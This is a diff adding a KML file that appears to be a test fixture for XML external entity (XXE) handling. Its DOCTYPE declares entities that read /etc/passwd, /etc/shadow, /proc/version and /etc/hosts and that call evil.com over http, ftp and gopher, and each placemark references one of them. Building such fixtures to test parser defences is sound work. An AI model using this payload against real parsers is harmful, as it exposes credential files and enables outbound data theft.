@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE kml [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    <!ENTITY xxe2 SYSTEM "file:///etc/shadow">
+    <!ENTITY xxe3 SYSTEM "file:///proc/version">
+    <!ENTITY xxe4 SYSTEM "file:///etc/hosts">
+    <!ENTITY xxe5 SYSTEM "http://evil.com/steal-data">
+    <!ENTITY xxe6 SYSTEM "ftp://evil.com/upload">
+    <!ENTITY xxe7 SYSTEM "gopher://evil.com/attack">
+]>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+    <Document>
+        <name>&xxe;</name>
+        <description>XXE Attack Test - Attempting to read system files</description>
+        
+        <Placemark>
+            <name>XXE Test Placemark</name>
+            <description>This placemark contains XXE entities: &xxe2;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+        
+        <Placemark>
+            <name>System Info</name>
+            <description>System version: &xxe3;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+        
+        <Placemark>
+            <name>Network Info</name>
+            <description>Hosts file: &xxe4;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+        
+        <Placemark>
+            <name>External Request</name>
+            <description>External entity: &xxe5;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+        
+        <Placemark>
+            <name>FTP Attack</name>
+            <description>FTP entity: &xxe6;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+        
+        <Placemark>
+            <name>Gopher Attack</name>
+            <description>Gopher entity: &xxe7;</description>
+            <Point>
+                <coordinates>-122.4194,37.7749,0</coordinates>
+            </Point>
+        </Placemark>
+    </Document>
+</kml>
